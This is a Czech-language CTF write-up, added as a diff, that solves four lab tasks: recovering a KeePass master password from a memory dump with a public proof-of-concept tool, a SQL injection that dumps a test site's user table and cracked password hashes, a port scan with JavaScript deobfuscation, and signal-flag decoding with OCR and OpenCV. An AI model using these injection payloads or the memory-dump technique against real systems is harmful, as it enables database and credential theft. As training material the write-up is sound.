@@ -642,3 +642,321 @@ $ echo 'rO0ABXVyABNbTGphdmEubGFuZy5TdHJpbmc7rdJW5+kde0cCAAB4cAAAAAJ0ACFEOi93aW4z
 ```
 
 Po dekódování z base64 šlo poznat.
+
+## Troubles on the bridge (získáno 14/14 bodů)
+
+### Captain's password (2/2 body)
+
+> Ahoy, officer,
+>
+> our captain has had too much naval espresso and is temporary unfit for duty.
+> The chief officer is in command now, but he does not know the captain's
+> passwords for key ship systems. Good news is that the captain uses password
+> manager and ship chief engineer was able to acquire captain's computer memory
+> crash dump. Your task is to acquire password for signalization system.
+>
+> May you have fair winds and following seas!
+>
+> Download the [database and memory dump](https://owncloud.cesnet.cz/index.php/s/LhKWx4kA8xWQq25/download).
+
+Ze staženého souboru na nás vypadne KeePass file (password manager)
+[`captain.kdbx`](12_Captains_password/captain.kdbx) a pak taky
+asi gigový dump paměti. Když si instalujeme KeePass a zkusíme soubor načíst, tak
+po nás samozřejmě chce master password. Musíme ho zjistit.
+
+Po chvilce hledání lze nalézt, že KeePass má známý exploit související s tím,
+jak pracuje s textovým políčkem při zadávání hesla. Při každém stisku klávesy do
+něj totiž přibude písmeno, ale KeePass ho hned změní na `●`. Bohužel kvůli
+práci se stringy okolo tohoto textového políčka ale v paměti zůstávají stringy
+s nějakým počtem `●` a s napsaným písmenem na konci:
+
+<https://www.bleepingcomputer.com/news/security/keepass-exploit-helps-retrieve-cleartext-master-password-fix-coming-soon/>
+
+Je dostupný i [PoC k tomuto útoku](https://github.com/vdohney/keepass-password-dumper),
+tak ho zkusíme na náš memory dump:
+
+```sh
+git clone https://github.com/vdohney/keepass-password-dumper
+cd keepass-password-dumper/
+dotnet run /tmp/crashdump.dmp
+```
+
+Vypadne z toho `Combined: ●{), ÿ, a, :, |, í, W, 5, \n, r, ¸}ssword4mypreciousship`,
+vypadá to na `password4mypreciousship`. A funguje!
+
+V KeePass souboru je dost hesel, zajímá nás ale to k Main Flag System, které má
+nápadně podobný tvar: `FLAG{pyeB-941A-bhGx-g3RI}`
+
+### Navigation plan (3/3 body)
+
+> Ahoy, officer,
+>
+> the chief officer was invited to a naval espresso by the captain and now they
+> are both unfit for duty. The second officer is very busy and he has asked you
+> to find out where are we heading according to the navigation plan.
+>
+> May you have fair winds and following seas!
+>
+> The navigation plan webpage is available at <http://navigation-plan.cns-jv.tcc>.
+
+Na uvedené adrese je web s obrázky lokací CNS Josef Verich, ale nejsou u nich
+uvedené informace. Taky je zde po rozkliknutí nabídky možnost na přihlášení,
+bohužel neznáme login ani heslo.
+
+Všimneme si, že obrázky jsou loadované přes query argumenty jako třeba
+`image.png?type=data&t=targets&id=1`. Pojďme si si tím hrát:
+
+Změníme `id` na 0 a dostaneme namísto obrázku chybu: <http://navigation-plan.cns-jv.tcc/image.png?type=data&t=targets&id=0>
+```
+<br />
+<b>Warning</b>:  Trying to access array offset on value of type null in <b>/var/www/html/image.php</b> on line <b>12</b><br />
+<br />
+<b>Deprecated</b>:  base64_decode(): Passing null to parameter #1 ($string) of type string is deprecated in <b>/var/www/html/image.php</b> on line <b>12</b><br />
+```
+-> na řádce 12 se bere něco z výsledků a base64 se to dekóduje
+
+Změníme `t` na `xxx`: <http://navigation-plan.cns-jv.tcc/image.png?type=data&t=xxx&id=1>
+```
+<br />
+<b>Fatal error</b>:  Uncaught mysqli_sql_exception: Table 'navigation.xxx' doesn't exist in /var/www/html/image.php:9
+Stack trace:
+#0 /var/www/html/image.php(9): mysqli_query(Object(mysqli), 'SELECT data FRO...')
+#1 {main}
+  thrown in <b>/var/www/html/image.php</b> on line <b>9</b><br />
+```
+-> určuje tabulku
+
+Změníme `type` na `xxx`: http://navigation-plan.cns-jv.tcc/image.png?type=xxx&t=targets&id=1
+```
+<br />
+<b>Fatal error</b>:  Uncaught mysqli_sql_exception: Unknown column 'xxx' in 'field list' in /var/www/html/image.php:9
+Stack trace:
+#0 /var/www/html/image.php(9): mysqli_query(Object(mysqli), 'SELECT xxx FROM...')
+#1 {main}
+  thrown in <b>/var/www/html/image.php</b> on line <b>9</b><br />
+```
+-> určuje sloupec
+
+Vypadá to na neošetřený web dovolující útok pomocí [SQL injection](https://cs.wikipedia.org/wiki/SQL_injection).
+Dosazením nevalidní syntaxe za `type` si můžeme obstarat kus query: <http://navigation-plan.cns-jv.tcc/image.png?type=)&t=xxx&id=8">
+```sql
+`) FROM xxx JOIN files ON targets.id = files.id_target WHERE targets.id = 8`
+```
+
+Vidíme, že `WHERE targets.id = ` je tam napevno, stejně tak `JOIN files`. Ale
+můžeme si namísto sloupce vytahovat cokoliv jiného, když to ještě base64 enkódujeme.
+
+Zjistíme tabulky v databázi, budeme chtít poslat tento výraz namísto názvu sloupce.
+```sql
+TO_BASE64((SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema='navigation'))
+```
+```sh
+$ curl -s "http://navigation-plan.cns-jv.tcc/image.png?type=TO_BASE64((SELECT%20GROUP_CONCAT(table_name)%20FROM%20information_schema.tables%20WHERE%20table_schema=%27navigation%27))&t=targets&id=8"
+files,targets,users
+```
+
+Dále již budu uvádět jen části SQL, které nastavíme do `type`, zkonstruovat URL
+už je pak hračka. Když teď víme názvy tabulek, tak je prozkoumáme a zjistíme, co
+mají za sloupce:
+```sql
+TO_BASE64((SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_schema='navigation' AND table_name='targets'))
+```
+* `targets`: id,id_user,name,location,raw,status,date_added,finished
+* `files`: id_file,id_user,id_target,data
+* `users`: id,username,password,rank,active
+
+Vytáhnout všechny hodnoty z konkrétní tabulky můžeme třeba takto:
+```sql
+TO_BASE64((SELECT GROUP_CONCAT(id) FROM users))
+```
+
+Postupně si vytáhneme všechny údaje o uživatelích. Hesla jsou SHA256 hashe,
+crackneme je pomocí https://crackstation.net/ obsahujácí hashe pro spoustu
+běžných hesel:
+* id=1, username=engeneer, rank=1, active=0, password=15e2b0d3c33891ebb0f1ef609ec419420c20e320ce94c65fbc8c3312448eb225
+  * cracked: `123456789`
+* id=2, username=captain, rank=0, active=1, password=7de22a47a2123a21ef0e6db685da3f3b471f01a0b719ef5774d22fed684b2537
+  * cracked: `$captainamerica$`
+* id=3, username=officer, rank=1, active=1, password=6a4aed6869c8216e463054dcf7e320530b5dc5e05feae6d6d22a4311e3b22ceb
+  * heslo jsme nenašli not found :(
+
+Zalogujeme se jako `captain` a pod Target 4 (Mariana Trench) je `FLAG{fmIT-QkuR-FFUv-Zx44}`
+
+### Keyword of the day (4/4 body)
+
+> Ahoy, officer,
+>
+> one of deck cadets (remember your early days onboard) had a simple task to
+> prepare simple web application to announce keyword of the day. He claimed that
+> the task is completed, but he forgot on which port the application is running.
+> Unfortunately, he also prepared a lot of fake applications, he claims it was
+> necessary for security reasons. Find the keyword of the day, so daily routines
+> on ship can continue.
+>
+> May you have fair winds and following seas!
+>
+> The webs are running somewhere on server `keyword-of-the-day.cns-jv.tcc`.
+
+Když uděláme `nmap -p- keyword-of-the-day.cns-jv.tcc`, tak zjistíme, že server
+odpovídá celkem na 234 portech z rozsahu od 60000 do 60495 ([seznam](15_Keyword_of_the_day/ports.txt)).
+
+Každý z nich zdá se vrací na pohled tu stejnou stránku stejné, ale obsah všech
+se mění každou sekundu! Liší se uvnitř jejich [obfuskovaného javascriptu](15_Keyword_of_the_day/original.js).
+Přesněji vždy v jednom elementu stringové pole (zvýrazněno níže):
+```js
+…,'158706KaxUIc','82f6647715','XpYtE','getElement','zkkfn']…
+//                ^^^^^^^^^^
+```
+
+[Obfuskace](https://cs.wikipedia.org/wiki/Obfuscator) je pozměnění nějakého kódu
+tak, aby byl velmi špatně čitelný. Často se tak brání proti příliš jednoduchému
+ukradení Javascriptu ze stránek nebo se v obfuskovaném kódu často ukrývají
+zákeřné skripty před objevením antiviry a podobnými skenery.
+
+Existují ale naštěstí deobfuskátory :) Zkusíme třeba <https://obf-io.deobfuscate.io/>
+a dostaneme tento kód.
+
+```js
+function getRandomInt(_0x12721b, _0x4bd30f) {
+  _0x12721b = Math.ceil(_0x12721b);
+  _0x4bd30f = Math.floor(_0x4bd30f);
+  return Math.floor(Math.random() * (_0x4bd30f - _0x12721b) + _0x12721b);
+}
+setTimeout(function () {
+  fn = getRandomInt(1, 4);
+  document.getElementById("loader").style.display = "none";
+  qn = "95f54a6471";
+  document.getElementById("myImage").src = "img/" + fn + ".png";
+}, getRandomInt(1, 7) * 1000);
+```
+
+Po chvíli zkoumání:
+
+* Je tam divné nepoužité `qn = "95f54a6471";`, které právě závisí na tom jednom
+  měnícím se elementu obfuskovaného stringového pole.
+* Kód zobrazí po chvilce obrázky `img/1.png` až `img/4.png`, existují ale až po číslo 7.
+  Můžeme zkontrolovat, že jsou obrázky všude stejné:
+```sh
+cat ports.txt | while read port; do echo -n "$port: "; curl -s http://keyword-of-the-day.cns-jv.tcc:$port/img/1.png | md5sum; done
+# vyjde nám, že jsou všude stejné :/
+```
+
+Znova se podíváme na Javascripty, odstraníme z nich měnící se část a uděláme md5sum,
+abychom našli, jestli je nějaká stránka odlišná:
+```sh
+$ cat ports.txt | while read port; do echo -n "$port: "; curl -s http://keyword-of-the-day.cns-jv.tcc:$port | sed "s/'158706KaxUIc','[^']*','XpYtE'//" | md5sum; done
+60000: 315b78a76684f24209855d40addca216  -
+60004: 315b78a76684f24209855d40addca216  -
+60009: 315b78a76684f24209855d40addca216  -
+60010: 315b78a76684f24209855d40addca216  -
+60011: 315b78a76684f24209855d40addca216  -
+60015: 315b78a76684f24209855d40addca216  -
+[...]
+60257: 5643468bd3a68c77f71d506e4957c66d  -
+[...]
+60487: 315b78a76684f24209855d40addca216  -
+60488: 315b78a76684f24209855d40addca216  -
+60489: 315b78a76684f24209855d40addca216  -
+60494: 315b78a76684f24209855d40addca216  -
+60495: 315b78a76684f24209855d40addca216  -
+```
+
+Jedna stránka vyčuhuje, její Javascript po de-obfuskaci vypadá takto (zobrazuje
+obrázek podle `qn`, ne `fn` a navíc `948cd06ca7` se nemění, narozdíl od zbytku stránek).
+```js
+function getRandomInt(_0x12721b, _0x4bd30f) {
+  _0x12721b = Math.ceil(_0x12721b);
+  _0x4bd30f = Math.floor(_0x4bd30f);
+  return Math.floor(Math.random() * (_0x4bd30f - _0x12721b) + _0x12721b);
+}
+setTimeout(function () {
+  fn = getRandomInt(1, 4);
+  document.getElementById("loader").style.display = "none";
+  qn = "948cd06ca7";
+  document.getElementById("myImage").src = "img/" + qn + ".png";
+}, getRandomInt(1, 7) * 1000);
+```
+
+Tento [obrázek](http://keyword-of-the-day.cns-jv.tcc:60257/img/948cd06ca7.png) říká `For FLAG follow this URI /948cd06ca7`. Na tomto [odkazu](http://keyword-of-the-day.cns-jv.tcc:60257/948cd06ca7/)
+na stejném portu pak získáme vlajku: `FLAG{DEIE-fiOr-pGV5-8MPc}`
+
+### Signal flags (5/5 bodů)
+
+> Ahoy, officer,
+>
+> after a reboot at 2023-10-02 11:30:18 UTC, the On-board signal flag
+> recognition system (OBSF-RS) has malfunctioned. The signal flags are no more
+> recognized and the only working function is to generate and save schematic
+> views, which are created every time a ship in the vicinity changes its
+> signaling. We need to know what the surrounding ships signaled and if we have
+> missed something important.
+>
+> May you have fair winds and following seas!
+>
+> Download the [schematic views](https://owncloud.cesnet.cz/index.php/s/J0z72ztOKzMLdHR/download).
+
+Na uvedeném odkazu dostaneme 90 obrázku o velikosti zhruba 4K*2K pixelů
+vypadajících zhruba takto:
+
+![](14_Signal_flags/image_example.png)
+
+Na každém obrázku je loď a:
+
+* nějaká textová metadata
+* vlajka lodi (vždy v zeleném rámečku a velká)
+* vlajky zpráv (vždy v zeleném rámečku a jednoznačně uspořádané zvrchu dolů)
+
+Na extrakci textových informací můžeme použít třeba [Tesseract OCR](https://github.com/tesseract-ocr/tesseract)
+a pak podle toho přejmenovat soubory popořadě podle timestampu z obrázku (stačí podle času):
+
+```sh
+$ sudo apt install tesseract-ocr python3-opencv
+$ cd images
+$ for a in *; do tesseract "$a" "$a"; done
+$ for a in *.png; do
+        id=`cat "$a.txt" | grep "Ship object ID:" | tr -dc '0-9'`
+        t=`cat "$a.txt" | grep "Timestamp:" | sed -E 's/.*GMT 2023-10-02 ([0-9:]*).*/\1/' | tr -d ':'`
+        # Přejmenujeme soubory popořadě podle ID a času
+        mv "$a" "$id-$t-$a"
+done
+```
+
+Teď již máme obrázky popořadě, ale co s nimi? Vezmeme si k ruce nějakou pomůcku
+pro dekódování [námořní vlajkové abecedy](https://cs.wikipedia.org/wiki/N%C3%A1mo%C5%99n%C3%AD_vlajkov%C3%A1_abeceda)
+a prozkoumáme ručně pár obrázků.
+
+Kódy na vlajkách skoro vždy začínají hexadecimálně `0x`, ale ruční hledání vlajky
+by bylo asi otravné. Ručně získáme obrázky vlajek (třeba pomocí Gimpu) a uložíme
+si je je do složky [`flags/`](14_Signal_flags/flags/):
+
+
+|   |                                  |   |                                  |   |                                  |   |                                  |   |                                  |
+| - | -------------------------------- | - | -------------------------------- | - | -------------------------------- | - | -------------------------------- | - | -------------------------------- |
+| A | ![](14_Signal_flags/flags/a.png) | I | ![](14_Signal_flags/flags/i.png) | Q | —                                | Y | ![](14_Signal_flags/flags/y.png) | 2 | ![](14_Signal_flags/flags/2.png) |
+| B | ![](14_Signal_flags/flags/b.png) | J | —                                | R | ![](14_Signal_flags/flags/r.png) | Z | —                                | 3 | ![](14_Signal_flags/flags/3.png) |
+| C | ![](14_Signal_flags/flags/c.png) | K | ![](14_Signal_flags/flags/k.png) | S | ![](14_Signal_flags/flags/s.png) |   |                                  | 4 | ![](14_Signal_flags/flags/4.png) |
+| D | ![](14_Signal_flags/flags/d.png) | L | ![](14_Signal_flags/flags/l.png) | T | —                                |   |                                  | 5 | ![](14_Signal_flags/flags/5.png) |
+| E | ![](14_Signal_flags/flags/e.png) | M | ![](14_Signal_flags/flags/m.png) | U | —                                |   |                                  | 6 | ![](14_Signal_flags/flags/6.png) |
+| F | ![](14_Signal_flags/flags/f.png) | N | ![](14_Signal_flags/flags/n.png) | V | ![](14_Signal_flags/flags/v.png) |   |                                  | 7 | ![](14_Signal_flags/flags/7.png) |
+| G | —                                | O | ![](14_Signal_flags/flags/o.png) | W | ![](14_Signal_flags/flags/w.png) | 0 | ![](14_Signal_flags/flags/0.png) | 8 | ![](14_Signal_flags/flags/8.png) |
+| H | ![](14_Signal_flags/flags/h.png) | P | ![](14_Signal_flags/flags/p.png) | X | ![](14_Signal_flags/flags/x.png) | 1 | ![](14_Signal_flags/flags/1.png) | 9 | ![](14_Signal_flags/flags/9.png) |
+
+Pomocí opencv si napíšeme Python skript na rozpoznávání vlakej. Na každý obrázek
+poštveme `cv2.matchTemplate` a najdeme výskyty každé vlajky. Pak už stačí jenom
+sort podle *y* pozice (shora dolů) a případně dekódovat hex stringy.
+
+Skript: [`solver.py`](14_Signal_flags/solver.py)
+
+Abychom nematchovali vlajky znaků na vlajkách států, je lepší hledat vlajky i se
+zeleným rámečkem.
+
+Po chvíli počítání vypadne pár textů ([kompletní výstup](14_Signal_flags/results.txt)).
+Zajímavé jsou ty vyslané finskou lodí:
+```
+CNS Josef verich, are your nets ok, too? ;-)
+CNS Josef verich, you can improve them by RkxBR3tsVHJHLTNvWG4tYW9aTi1aNHFNfQ== !
+```
+
+Po base64 dekódování získáme finálně vlajku `FLAG{lTrG-3oXn-aoZN-Z4qM}`. Toto
+byla úloha, u které bylo od začátku jasné, co s ní dělat, a jsem rád, že jsem si
+díky ní zase po čase osvěžil práci s OpenCV.
